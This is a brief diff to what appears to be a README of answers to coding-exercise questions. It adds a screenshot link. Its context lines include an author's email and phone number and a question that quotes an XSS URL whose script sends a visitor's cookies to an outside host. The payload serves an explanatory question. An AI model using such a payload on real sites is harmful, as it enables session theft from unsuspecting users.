@@ -75,6 +75,9 @@ Contact : sunnysidesounds@gmail.com / 415-690-3590
     * Location: `src/questions3/Accounts/Accounts.test.js` (integration endpoint tests)
     * Location: `src/questions3/Common/Compare.test.js` (unit tests)
 
+* Screenshots:
+<img width="1142" alt="Screen Shot 2020-10-12 at 9 34 32 PM" src="https://user-images.githubusercontent.com/1030838/95816054-049d9100-0cd3-11eb-918e-3f045cef0eaa.png">
+
 
 ## Question 4:
 * Question: What harm could result from the following? `http://www.example.com/search?q=<script>object.src="http://otherexample.com/code?data="+document.cookie</script>`
